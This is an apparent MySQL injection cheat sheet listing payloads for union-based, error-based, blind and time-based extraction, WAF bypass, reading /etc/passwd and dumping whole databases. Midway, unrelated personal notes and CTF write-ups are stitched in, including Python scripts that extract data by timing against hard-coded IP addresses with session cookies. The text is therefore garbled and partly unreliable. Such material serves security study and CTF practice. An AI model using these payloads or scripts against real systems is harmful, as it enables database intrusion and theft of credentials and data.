# MYSQL Injection

## Summary

* [MYSQL Comment](#mysql-comment)
* [MYSQL Union Based](#mysql-union-based)
    * [Detect columns number](#detect-columns-number)
    * [Extract database with information_schema](#extract-database-with-information_schema)
    * [Extract columns name without information_schema](#extract-columns-name-without-information_schema)
    * [Extract data without columns name](#extract-data-without-columns-name)
* [MYSQL Error Based](#mysql-error-based)
    * [MYSQL Error Based - Basic](#mysql-error-based---basic)
    * [MYSQL Error Based - UpdateXML function](#mysql-error-based---updatexml-function)
    * [MYSQL Error Based - Extractvalue function](#mysql-error-based---extractvalue-function)
* [MYSQL Blind](#mysql-blind)
    * [MYSQL Blind with substring equivalent](#mysql-blind-with-substring-equivalent)
    * [MYSQL Blind using a conditional statement](#mysql-blind-using-a-conditional-statement)
    * [MYSQL Blind with MAKE_SET](#mysql-blind-with-make_set)
    * [MYSQL Blind with LIKE](#mysql-blind-with-like)
* [MYSQL Time Based](#mysql-time-based)
    * [Using SLEEP in a subselect](#using-sleep-in-a-subselect)
    * [Using conditional statements](#using-conditional-statements)
* [MYSQL DIOS - Dump in One Shot](#mysql-dios---dump-in-one-shot)
* [MYSQL Current queries](#mysql-current-queries)
* [MYSQL Read content of a file](#mysql-read-content-of-a-file)
* [MYSQL Write a shell](#mysql-write-a-shell)
    * [Into outfile method](#into-outfile-method)
    * [Into dumpfile method](#into-dumpfile-method)
* [MYSQL UDF command execution](#mysql-udf-command-execution)
* [MYSQL Truncation](#mysql-truncation)
* [MYSQL Fast Exploitation](#mysql-fast-exploitation)
* [MYSQL Out of band](#mysql-out-of-band)
    * [DNS exfiltration](#dns-exfiltration)
    * [UNC Path - NTLM hash stealing](#unc-path---ntlm-hash-stealing)
* [References](#references)


## MYSQL comment

```sql
# MYSQL Comment
/* MYSQL Comment */
/*! MYSQL Special SQL */
/*!32302 10*/ Comment for MYSQL version 3.23.02
```


## MYSQL Union Based

### Detect columns number

First you need to know the number of columns

##### Using `order by` or `group by`

Keep incrementing the number until you get a False response.
Even though GROUP BY and ORDER BY have different funcionality in SQL, they both can be used in the exact same fashion to determine the number of columns in the query.

```sql
1' ORDER BY 1--+	#True
1' ORDER BY 2--+	#True
1' ORDER BY 3--+	#True
1' ORDER BY 4--+	#False - Query is only using 3 columns
                        #-1' UNION SELECT 1,2,3--+	True
```
or 
```sql
1' GROUP BY 1--+	#True
1' GROUP BY 2--+	#True
1' GROUP BY 3--+	#True
1' GROUP BY 4--+	#False - Query is only using 3 columns
                        #-1' UNION SELECT 1,2,3--+	True
```
##### Using `order by` or `group by` Error Based
Similar to the previous method, we can check the number of columns with 1 request if error showing is enabled.
```sql
1' ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+

# Unknown column '4' in 'order clause'
# This error means query uses 3 column
#-1' UNION SELECT 1,2,3--+	True
```
or
```sql
1' GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+

# Unknown column '4' in 'group statement'
# This error means query uses 3 column
#-1' UNION SELECT 1,2,3--+	True
```
##### Using `UNION SELECT` Error Based
This method works if error showing is enabled
```sql
1' UNION SELECT @--+        #The used SELECT statements have a different number of columns
1' UNION SELECT @,@--+      #The used SELECT statements have a different number of columns
1' UNION SELECT @,@,@--+    #No error means query uses 3 column
                            #-1' UNION SELECT 1,2,3--+	True
```
##### Using `LIMIT INTO` Error Based
This method works if error showing is enabled.

It is useful for finding the number of columns when the injection point is after a LIMIT clause.
```sql
1' LIMIT 1,1 INTO @--+        #The used SELECT statements have a different number of columns
1' LIMIT 1,1 INTO @,@--+      #The used SELECT statements have a different number of columns
1' LIMIT 1,1 INTO @,@,@--+    #No error means query uses 3 column
                              #-1' UNION SELECT 1,2,3--+	True
```
##### Using `SELECT * FROM SOME_EXISTING_TABLE` Error Based
This works if you know the table name you're after and error showing is enabled.

It will return the amount of columns in the table, not the query.

```sql
1' AND (SELECT * FROM Users) = 1--+ 	#Operand should contain 3 column(s)
                                        # This error means query uses 3 column
                                        #-1' UNION SELECT 1,2,3--+	True
```
### Extract database with information_schema

Then the following codes will extract the databases'name, tables'name, columns'name.

```sql
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...
```

### Extract columns name without information_schema

Method for `MySQL >= 4.1`.

First extract the column number with 
```sql
?id=(1)and(SELECT * from db.users)=(1)
-- Operand should contain 4 column(s)
```

Then extract the column name.
```sql
?id=1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)
--Column 'id' cannot be null
```

Method for `MySQL 5`

```sql
-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b)a
--#1060 - Duplicate column name 'id'

-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a
-- #1060 - Duplicate column name 'name'

-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a
...
```

### Extract data without columns name 

Extracting data from the 4th column without knowing its name.

```sql
select `4` from (select 1,2,3,4,5,6 union select * from users)dbname;
```

Injection example inside the query `select author_id,title from posts where author_id=[INJECT_HERE]`

```sql
MariaDB [dummydb]> select author_id,title from posts where author_id=-1 union select 1,(select concat(`3`,0x3a,`4`) from (select 1,2,3,4,5,6 union select * from users)a limit 1,1);
+-----------+-----------------------------------------------------------------+
| author_id | title                                                           |
+-----------+-----------------------------------------------------------------+
|         1 | a45d4e080fc185dfa223aea3d0c371b6cc180a37:veronica80@example.org |
+-----------+-----------------------------------------------------------------+
```





## MYSQL Error Based

### MYSQL Error Based - Basic

Works with `MySQL >= 4.1`

```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
'+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'
```

### MYSQL Error Based - UpdateXML function

```sql
AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--
```

Shorter to read:

```sql
' and updatexml(null,concat(0x0a,version()),null)-- -
' and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -
```

### MYSQL Error Based - Extractvalue function

Works with `MySQL >= 5.1`

```sql
?id=1 AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--
?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--
```

## MYSQL Blind

### MYSQL Blind with substring equivalent

```sql
?id=1 and substring(version(),1,1)=5
?id=1 and right(left(version(),1),1)=5
?id=1 and left(version(),1)=4
?id=1 and ascii(lower(substr(Version(),1,1)))=51
?id=1 and (select mid(version(),1,1)=4)
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
```

### MySQL Blind SQL Injection in ORDER BY clause using a binary query and REGEXP

This query basically orders by one column or the other, depending on whether the EXISTS() returns a 1 or not.
For the EXISTS() function to return a 1, the REGEXP query needs to match up, this means you can bruteforce blind values character by character and leak data from the database without direct output.

```
[...] ORDER BY (SELECT (CASE WHEN EXISTS(SELECT [COLUMN] FROM [TABLE] WHERE [COLUMN] REGEXP "^[BRUTEFORCE CHAR BY CHAR].*" AND [FURTHER OPTIONS / CONDITIONS]) THEN [ONE COLUMN TO ORDER BY] ELSE [ANOTHER COLUMN TO ORDER BY] END)); -- -
```

### MySQL Blind SQL Injection binary query using REGEXP.

Payload:
```
' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP "^a.*") THEN SLEEP(3) ELSE 1 END)); -- -
```

Would work in the query (where the "where" clause is the injection point):
```
SELECT name,price FROM items WHERE name = '' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP "^a.*") THEN SLEEP(3) ELSE 1 END)); -- -';
```

In said query, it will check to see if an item exists in the "name" column in the "items" database that starts with an "a". If it will sleep for 3 seconds per item.

### MYSQL Blind using a conditional statement

TRUE: `if @@version starts with a 5`:

```sql
2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2


1)describe <table_name> # to see the structure of a table
2)import in cli# mysql -u Username -p dbNameYouWant < databasename_backup.sql;
3)export in clie #mysqldump -u Username -p dbNameYouWant > databasename_backup.sql
4)SHOW CREATE TABLE <table>; #to see the query which was used to create that table with all the structure and stuff
5)SHOW PROCESSLIST; KILL process_number; # show and kill proccess
6)SELECT * FROM table1, table2; # select rows from multiple tables
7)SELECT COUNT(column_name)
FROM table_name
WHERE condition;
#to return the count of number of entries in a column
same way we can do avg and sum and min and max as well

8)% - The percent sign represents zero, one, or multiple characters
_ - The underscore represents a single character

this is used for like statement
ex:WHERE CustomerName LIKE '_r%'	Finds any values that have "r" in the second position
h[^oa]t finds hit, but not hot and hat
c[a-b]t finds cat and cbt

9)SELECT * FROM Customers
WHERE Country IN ('Germany', 'France', 'UK');
SELECT * FROM Customers
WHERE Country NOT IN ('Germany', 'France', 'UK');

#in and not in just like python check if these values in the that columnn and displays only them

10)SELECT * FROM Products
WHERE Price BETWEEN 10 AND 20; # if  the price is between that range select only those rows
SELECT * FROM Products
WHERE Price NOT BETWEEN 10 AND 20;

11)get rows from two tables like this use aliases to make it shorter and easier
SELECT u.*,p.price from users as u,products as p WHERE u.name = 'Amy' AND p.price = 10000

12) inner join to get common
SELECT Orders.OrderID, Customers.CustomerName, Orders.OrderDate
FROM Orders
INNER JOIN Customers ON Orders.CustomerID=Customers.CustomerID;

13)(INNER) JOIN: Returns records that have matching values in both tables
LEFT (OUTER) JOIN: Returns all records from the left table, and the matched records from the right table
RIGHT (OUTER) JOIN: Returns all records from the right table, and the matched records from the left table
FULL (OUTER) JOIN: Returns all records when there is a match in either left or right table

14)left join:
SELECT Customers.CustomerName, Orders.OrderID
FROM Customers
LEFT JOIN Orders ON Customers.CustomerID = Orders.CustomerID
ORDER BY Customers.CustomerName;

select all entried from customer table and displays any order they have

15)to get all tables
select * from users where name = 'Amy' UNION select 1,`TABLE_NAME`,3 from `information_schema`.`TABLES` WHERE `TABLE_SCHEMA` = 'testingfrompython' # can write last part as database() also

16)select * from users where name = 'Amy' UNION select id,name,price from `products` basic union query

17)SELECT COUNT(*) FROM `users` WHERE `name` = 'sdadadas' OR substring(column_name of the table in the query) = '1'
while doing substring attack always enclose substring in () like so (substring('hello',1,1)) = 'h'


this is syntax for substring in mysql

18)SELECT COUNT(CustomerID), Country
FROM Customers
GROUP BY Country;

displays count of each country

The following SQL statement lists the number of orders sent by each shipper:

Example
SELECT Shippers.ShipperName, COUNT(Orders.OrderID) AS NumberOfOrders FROM Orders
LEFT JOIN Shippers ON Orders.ShipperID = Shippers.ShipperID
GROUP BY ShipperName;

19)	SELECT COUNT(CustomerID), Country
FROM Customers
GROUP BY Country
HAVING COUNT(CustomerID) > 5;

having is a like another condition checker similar to where

20)
SELECT SupplierName
FROM Suppliers
WHERE EXISTS (SELECT ProductName FROM Products WHERE Products.SupplierID = Suppliers.supplierID AND Price = 22);

this is how we use the exists command

21)SELECT * from users LIMIT <which entry to show starts from 0>,<how many entries show>

SQL Injection Syntax Cheatsheet
John Hammond

Leak all of the database names as a string
SELECT GROUP_CONCAT( SCHEMA_NAME ) FROM INFORMATION_SCHEMA.SCHEMATA

Leak all of the tables in one database as a string
SELECT GROUP_CONCAT( TABLE_NAME ) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA="<DATABASE_NAME>"
TO DO THIS FOR SQLite:

SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table'

Leak the column names of a table as a string

SELECT GROUP_CONCAT( COLUMN_NAME ) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME="<TABLE NAME>"
TO LEAK THE WHOLE SCHEMA OF A TABLE IN SQLITE:

SELECT GROUP_CONCAT(sql) FROM sqlite_master WHERE type='table'

Leak the ONE column from a table
SELECT GROUP_CONCAT( "<COLUMN_NAME>" ) FROM "<TABLE NAME>"
IF THIS DOES NOT WORK, TRY WITHOUT THE QUOTES!!

In-line Conditions (an if statement)
SELECT "value" CASE WHEN condition>0 THEN 'return this' ELSE 'return instead' END
This may be best used with timing attacks, like SLEEP(1) as the else condition action. Other option might be:

SELECT ( IF ( 1=1, "Condition successful!", "Condition errored!" ) )
Get the path of the running MySQL instance
SELECT @@datadir
Get the version of the running MySQL instance
SELECT @@version
Get current user
SELECT user();
SELECT system_user();
Read a file
SELECT LOAD_FILE("/etc/passwd");
Etcetera..
Some applications try to replace keywords with an empty string. If this is the case, try and trick it by placing the keyword inside of itself. This is devious!

frfromom => from
oorr => or
loaload_filed_file => load_file
selselectect => select


23)
Variable/function	Output
user()	Current User
database()	Current Database
version()	Database Version
schema()	Current Database
UUID()	System UUID Key
current_user()	Current User
system_user()	Current System User
session_user()	Session User
@@hostname	Current Hostname
@@tmpdir	Temporary Directory
@@datadir	Data Directory
@@version	Version of Database
@@basedir	Base Directory
@@GLOBAL.have_symlink	Check if the symlink is Enabled or Disabled
@@GLOBAL.have_ssl	Check if it SSL is available


24)multiple group_concats are possible seperated by a comma if only 1 row being displayed use limit 1,1 then limit 2,1 like that
if the first row being displayed from union and only limit 1 the give invalid input so that our union row will be displayed



25)http://localhost:81/sqli/Less-8/?id=1' AND (length(database())) = 1 --+   length is also a function make sure to wrap it around ()

26)another name for substring is substr and (ascii) also can be used like so


http://localhost:81/sqli/Less-8/?id=1' AND (ascii(substr((select database()),1,1))) > 100 --+

everything has to be in ()

for ex: for ascii or for using select in substring or length or anything

(select database())

(ascii((substring((select database()),1,1)))

the same for length and ascii and substring and substr or anyother our select statements have to be enclosed in ()

if you do not know the database just use database() everywhere for information scheme or anything

when selecting table_name from database from information_scheme check LIMIT 0,1 then LIMIT 1,1 to get all table names

to check user privilages for current_user()

SHOW GRANTS FOR 'root'@'localhost'


replacement for or and and is

AND :   &&   %26%26 

OR: || 

try this for comments --+

if only union select does not work add or 1=1 after union select but make the select before union select bogus if only 1 row is being displayed

bypass spaces in sql Blanks = (‘%09’, ‘%0A’, ‘%0C’, ‘%0D’, ‘%0B’ ‘%a0’)

we can also bypass by using comments like so 1'/**/or/**/1=1#

this to enumerate number of rows in users table

select * from users where id = 56 or (1=(select count(1) from users where id = 1))
or 
select * from users where id = 56 or (IF((SELECT count(1) from users where id =1)=1,1,0))

this is another way to check for condition

General select syntax:

UniOn selEct [number of columns] [comment]

ex:
union select 1,2,3,4,5

Examples:
We will assume that there are 2 columns and comlumn 2 can be used to display data on screen.

Seleting database version:
UniOn selEct 1,version() /*

Database:
UniOn selEct 1,database() /*

Database user:
UniOn selEct 1,user() /*

Database tables:
UniOn selEct 1,table_name frOm information_schema.tables where table_schema = '[database name]' /*

Table Columns:
UniOn selEct 1,column_name frOm information_schema.columns where table_name = '[table name]' /*

Selecting data from table:
UniOn selEct 1,[column name] frOm [table name] /*

Reading files:
UniOn selEct 1,load_file('file location') /*

Writing files:
UniOn selEct null,[file content] inTo outfile '/location/to/write/file/to' /*


instead of using union + select in plain text if website using some kinf of waf you can use multi line comments


/?id=1+un/**/ion+sel/**/ect+1,2,3--

some sql injection waf bypass tips and tricks

SELECT * from users where id = -1 un/*!*/ion sel/*!*/ect database(),version(),substr((SELECT age from users LIMIT 2,1),1,10)

capitalize in some wafs

www.[site].com/index.php?id=-1+UnIoN+SeLeCt+1,2,3,4--+-

So what's the solution for this problem ?
Well we can use SQL special comments, they start with /*! instead of only /* and that's great because in the second query, the input is already a comment, we just need to prepend the input with !. But first what does these special comments do ?

A query that looks like this

SELECT secret FROM top_secrets /*! WHERE id=1 */
is EXACTLY equivalent to

SELECT secret FROM top_secrets WHERE id=1
It's as if there was no comment at ALL, amazing right ?


there is a sql space trick

suppose the max length of a column is 10

if you give the name of an entry that already exists and give spaced and fill out the max chars with anything and register with a password

when you login it will login with the present entry also for more details watch natas level 27 walkthrough john hammond

' or extractvalue(1,concat(0x7e,database())) or '1'='1';--+

# Source

```
> Don't know source is helpful or not !!

> Write-up : Change User Agent As 9e9

> category : web

> Flag : darkCTF{changeing_http_user_agent_is_easy}

```

# Simple SQL

```
> Try to find username and password

> Write-up : http://<ip>/index.php?id=5

> category : web

> Flag : darkCTF{it_is_very_easy_to_find}

```

# So_Simple

```
>  "Try Harder" may be You get flag manually

> Write-up : 1.) -1' union select 1,(select database()),'3
			 2.) -1' union select 1,(select group_concat(schema_name) from information_schema.schemata),'3
			 3.) -1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),'3
			 4.) -1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='security' and          table_name='users'),'3
			 5.) -1' union select 1,(select group_concat(username,0x3a,password) from users),'3

> category : web

> Flag : darkCTF{uniqu3_ide4_t0_find_fl4g}

```

# Agent U

```
>  Agent U Steal Database from my company but don't know which one can u help me to find flag format darkCTF{databasename}

> Write-up : Change Default User-Agent To "' and updatexml(1,concat(0x7e,(select database()),0x7e),1) and '1'='1"

> category : web

> Flag : darkCTF{ag3nt_u_1s_v3ry_t3l3nt3d}

```
# Safe House

```
> Agent xer is hiding some information in secure safe, you have to get that information from him !!

> Write-up : 1.) ?xer=1' || extractvalue(1,concat(0x7e,(select database()),0x7e)) --+
			 2.) ?xer=1' || extractvalue(1,concat(0x7e,(select group_concat(schema_name) from infoorrmation_schema.schemata),0x7e))--+
			 3.) ?xer=1' || extractvalue(1,concat(0x7e,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema='agentxer'),0x7e))--+ 
			 4.) ?xer=1' || extractvalue(1,concat(0x7e,(select group_concat(column_name) from infoorrmation_schema.columns where table_schema='agentxer' aandnd table_name='referers'),0x7e))--+
			 5.) ?xer=1' || extractvalue(1,concat(0x7e,(select group_concat(referer) from referers),0x7e))--+

> category : web

> Flag : darkCTF{S3cur3_s4f3_h0us3}

```


http://www.securityidiots.com/Web-Pentest/SQL-Injection/XPATH-Error-Based-Injection-Extractvalue.html

ExtractValue('xmldatahere', 'xpathqueryhere')

XPATH syntax error: 'xpathqueryhere'

always use group_concat

www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(OUR QUERY HERE)))--

www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(select database())))--


www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))--

www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)))--


www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(select count(username) from users)))--


www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(select count(username,0x3a,password) from users limit 0,1)))--

as you can see i used limit as we cannot extract long data which limits upto 32 characters. So i prefer :P to go one by one increasing the row to get the output. well if you want to dump the database go for any tool or manual proxy else create your own script to get the data dumped for you which I prefer to be the best option.

You can use SUBSTRING(fieldname,31,31) in order to extract the next 31 characters.
You need to run your injection twice (or as many times as needed) in order to extract the entire value of the field.

AND extractvalue(rand(),concat(0x3a,(SELECT SUBSTRING(fieldname,1,30) FROM tablename LIMIT 0,1)))--

Change 0,30 to 31,30 to get the next 31 characters. You can keep adding 31 (31,62,etc) until you get a single ":" as an answer

we can do select sleep(5); in sql this will sleep this also used for blind injection
where username like a% and select sleep(5);

http://www.securityidiots.com/Web-Pentest/SQL-Injection/XPATH-Error-Based-Injection-UpdateXML.html

and updatexml(null,concat(0x0a,query),null) -- -

payload = "00' UNION select 1,2, extractvalue(1,concat(0x3a,(select referer from referers))) -- "
#payload = "%00%0a' UNION select 1,2, extractvalue(1,concat(0x3a,(select COLUMN_NAME from infoorrmation_schema.COLUMNS WHERE TABLE_SCHEMA = \"agentxer\" && TABLE_NAME = \"referers\" LIMIT 1,1))) -- "
#payload = "%00%0a' UNION select 1,2, extractvalue(1,concat(0x3a,(select TABLE_NAME from infoorrmation_schema.TABLES WHERE TABLE_SCHEMA = \"agentxer\" LIMIT 0,1))) -- "

select id,username from users where id = '1' union select 1,extractvalue(null,concat(0x0a,database())) -- -                    '



This challenge the `filters` parm have the sql injection 

sql injection in order by clause

payload:   data = {'filters':'if(ord(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()),'+str(i)+',1))='+str(j)+',sleep(1),1)'}


import requests
import time

header = {'Cookie':'PHPSESSID=621i7cn3m8ibhv3or2cgf9rblh'}
flag = 'pineapple,pixels,doors,flowers,fusion,'
for i in range(len(flag)+1,300):
    for j in range(32,127):
        t1 = time.time()
        data = {'filters':'if(ord(substr((select/**/group_concat(name)/**/from/**/products),'+str(i)+',1))='+str(j)+',sleep(1),1)'}
        conn = requests.post('http://65.0.4.132/home.php',data=data, headers=header)
        r1 = conn.text
        #print r1
        t2 = time.time()
        #print t2-t1, j
        if t2-t1 > 1:
            flag += chr(j)
            print flag
            break

import requests as r

url = 'http://65.0.54.62/home.php'
cookie={'PHPSESSID':'d84q2cg0st4ugafitta6o59lc5'}

#table length extraction
print('Starting length extraction: \r\n')
for i in range(1,20):
    #print(' currentlength '+str(i))
    payload='1,(select/**/if(((select/**/length(group_concat(table_name))/**/from/**/information_schema.tables/**/where/**/table_schema=database())='+str(i)+'),NULL,sleep(1)))'
    res = r.post(url,cookies=cookie,data={'filters':payload})
    if(res.elapsed.total_seconds()<4.00):
        tabllength = i
        print('Length of the tables concatenated:'+str(i))
        #print(res.text)
        print(res.elapsed.total_seconds())
        break


print('starting table name extraction: \r\n')
tablename=''
for i in range(1,tabllength+1):
    for j in range(97,122):
        #print(str(i)+' '+chr(j))
        payload='1,(select/**/if((substring((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),'+str(i)+',1)=unhex(hex('+str(j)+'))),NULL,sleep(1)));'
        res = r.post(url,cookies=cookie,data={'filters':payload})
        if(res.elapsed.total_seconds()<4.00):
            tablename = tablename+chr(j)
            break
print(tablename)

print('starting column length extraction: \r\n')
for i in range(10,25):
    #print('curr column length: '+str(i))
    payload='1,(select/**/if(((select/**/length(group_concat(column_name))/**/from/**/information_schema.columns/**/where/**/table_name=(concat(lower(conv(25,10,36)),lower(conv(27,10,36)),lower(conv(24,10,36)),lower(conv(13,10,36)),lower(conv(30,10,36)),lower(conv(12,10,36)),lower(conv(29,10,36)),lower(conv(28,10,36)))))='+str(i)+'),NULL,sleep(1)));'
    res = r.post(url,cookies=cookie,data={'filters':payload})
    if(res.elapsed.total_seconds()<4.00):
        collength = i
        print('Length of the columns concatenated: '+str(i))
        #print(res.text)
        break

print('starting column names extraction: ')
colname=''
for i in range(1,collength+1):
    for j in range(97,122):
        #print(str(i)+' '+chr(j))
        payload='1,(select/**/if(((substring((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=(concat(lower(conv(25,10,36)),lower(conv(27,10,36)),lower(conv(24,10,36)),lower(conv(13,10,36)),lower(conv(30,10,36)),lower(conv(12,10,36)),lower(conv(29,10,36)),lower(conv(28,10,36))))),'+str(i)+',1))=unhex(hex('+str(j)+'))),NULL,sleep(1)))'
        res = r.post(url,cookies=cookie,data={'filters':payload})
        if(res.elapsed.total_seconds()<4.00):
            colname = colname+chr(j)
            break
print('concatenated column names: '+ colname)

print('Starting to extract flag length: ')
for i in range(30,50):
    #print('curr flag length: '+str(i))
    payload = '1,(select/**/if((length((select/**/name/**/from/**/products/**/where/**/exclusive=1))='+str(i)+'),NULL,sleep(1)));'
    res = r.post(url,cookies=cookie,data={'filters':payload})
    if(res.elapsed.total_seconds()<4.00):
        flaglength = i
        print('Length of the flag: '+str(i))
        #print(res.text)
        break
print('starting to extract flag: ')
flag=''
for i in range(1,36) :
    for j in range(48,126):
        #print(str(i)+' '+chr(j))
        payload='1,(select/**/if(((hex(substring((select/**/name/**/from/**/products/**/where/**/exclusive=1),'+str(i)+',1)))=hex('+str(j)+')),NULL,sleep(1)));'
        res = r.post(url,cookies=cookie,data={'filters':payload})
        if(res.elapsed.total_seconds()<4.00):
            flag = flag+chr(j)
            #print(flag)
            break
print('Flag: '+ flag)

Response:
HTTP/1.1 500 Internal Server Error
```

False: `if @@version starts with a 4`:

```sql
2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2
Response:
HTTP/1.1 200 OK
```

### MYSQL Blind with MAKE_SET

```sql
AND MAKE_SET(YOLO<(SELECT(length(version()))),1)
AND MAKE_SET(YOLO<ascii(substring(version(),POS,1)),1)
AND MAKE_SET(YOLO<(SELECT(length(concat(login,password)))),1)
AND MAKE_SET(YOLO<ascii(substring(concat(login,password),POS,1)),1)
```

### MYSQL Blind with LIKE

['_'](https://www.w3resource.com/sql/wildcards-like-operator/wildcards-underscore.php) acts like the regex character '.', use it to speed up your blind testing

```sql
SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';
```

## MYSQL Time Based

The following SQL codes will delay the output from MySQL.

```sql
+BENCHMARK(40000000,SHA1(1337))+
'%2Bbenchmark(3200,SHA1(1))%2B'
AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))  //SHA1
RLIKE SLEEP([SLEEPTIME])
OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
```

### Using SLEEP in a subselect

```powershell
1 and (select sleep(10) from dual where database() like '%')#
1 and (select sleep(10) from dual where database() like '___')# 
1 and (select sleep(10) from dual where database() like '____')#
1 and (select sleep(10) from dual where database() like '_____')#
1 and (select sleep(10) from dual where database() like 'a____')#
...
1 and (select sleep(10) from dual where database() like 's____')#
1 and (select sleep(10) from dual where database() like 'sa___')#
...
1 and (select sleep(10) from dual where database() like 'sw___')#
1 and (select sleep(10) from dual where database() like 'swa__')#
1 and (select sleep(10) from dual where database() like 'swb__')#
1 and (select sleep(10) from dual where database() like 'swi__')#
...
1 and (select sleep(10) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%pass%' limit 0,1) like '%')#
```

### Using conditional statements

```sql
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1)))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1)))>=100, 1, SLEEP(3)) --
?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
```

## MYSQL DIOS - Dump in One Shot

```sql
(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#

(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#

-- SecurityIdiots
make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)

-- Profexer
(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)

-- Dr.Z3r0
(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@))

-- M@dBl00d
(Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))

